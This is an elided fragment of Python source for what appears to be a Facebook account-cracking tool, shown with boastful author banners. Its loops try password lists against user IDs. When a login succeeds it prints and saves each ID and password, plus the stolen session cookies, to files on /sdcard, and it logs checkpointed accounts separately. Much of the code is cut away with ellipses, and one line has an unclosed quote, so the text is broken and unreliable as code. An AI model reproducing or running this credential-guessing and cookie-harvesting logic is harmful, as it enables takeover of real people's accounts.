...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/shershah.jan.12)
def ua_api():
...
==============================================
\033[1;32m----------------------------------------------
 Owner        :   XSAT XAT WA GEEEM 😹🍾😹
 AUTHOR       :   XSAT XAT WA GEEEM 😹🍾😹
 FACEBOOK     :   XSAT XAT WA GEEEM 😹🍾😹
 GITHUB       :   XSAT XAT WA GEEEM 😹🍾😹
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-HAROON KHAN-OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [-XSAT XAT WA GEEEM 😹🍾😹-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/XSAT XAT WA GEEEM 😹🍾😹-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/XSAT XAT WA GEEEM 😹🍾😹--OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [XSAT XAT WA GEEEM 😹🍾😹==>OK]\33[0;m\033[1;33m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/KING XSAT XAT WA GEEEM 😹🍾😹R.txt','a').write(coki+'\n')
                                        open('/sdcard/KING XSAT XAT WA GEEEM 😹🍾😹 R.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [XSAT XAT WA GEEEM 😹🍾😹 R👉CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/XSAT XAT WA GEEEM 😹🍾😹 R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
